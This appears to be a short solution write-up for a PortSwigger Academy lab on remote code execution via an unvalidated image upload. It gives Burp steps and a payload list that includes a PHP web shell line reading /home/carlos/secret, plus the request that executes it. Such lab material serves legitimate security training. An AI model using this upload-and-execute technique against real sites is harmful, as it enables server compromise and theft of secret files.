# Lab: Remote code execution via web shell upload

**Official lab:** [https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload](https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload)

## Lab idea

This lab contains a vulnerable image upload function. It doesn't perform any validation on the files users upload before storing them on the server's filesystem. The challenge focuses on the consequences of accepting uploaded files without validation when they are stored on the server, and the risk that a server-side file may be interpreted as code.

## Vulnerability in brief
There is no widely used acronym for this topic.

## Solution idea
1. While proxying traffic through Burp, log in to your account and notice the option for uploading an avatar image.
2. Upload an arbitrary image, then return to your account page.
3. In Burp, go to Proxy > HTTP history .
4. In the proxy history, notice that your image was fetched using a GET request to /files/avatars/<YOUR-IMAGE> .
- …
6. In Burp Repeater, change the path of the request to point to your PHP file: GET /files/avatars/exploit.php HTTP/1.1
7. Send the request.
8. Submit the secret to solve the lab.

## Payloads / key values
- `GET`
- `/files/avatars/<YOUR-IMAGE>`
- `exploit.php`
- `<?php echo file_get_contents('/home/carlos/secret'); ?>`
- `GET /files/avatars/exploit.php HTTP/1.1`

## Official source
- [PortSwigger Academy: Lab: Remote code execution via web shell upload](https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload)
